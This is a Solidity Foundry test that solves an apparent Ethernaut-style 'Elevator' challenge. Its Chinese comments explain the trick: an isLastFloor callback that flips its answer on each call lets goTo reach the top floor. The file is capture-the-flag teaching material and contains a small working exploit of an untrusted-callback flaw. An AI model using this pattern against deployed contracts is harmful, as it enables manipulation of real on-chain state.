pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Elevator.sol";


/** 
 * 解题思路：如果 isLastFloor 对弈同一个楼层返回的结果一致，那么就永远到达不了顶层，所以要让同一楼层连续两次返回的结果不一致
 */
contract HackElevatorTest is Test {
    address hacker = address(hacker);
    Elevator public e;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        e = new Elevator();
    }

    bool isTop = true;
    function testHackElevator() public {
        e.goTo(1);
        assert(e.top() == true);
    }

    // 让连续两次访问的结果不一致即可
    function isLastFloor(uint256 f) external returns (bool) {
        isTop = !isTop;
        return isTop;
    }
}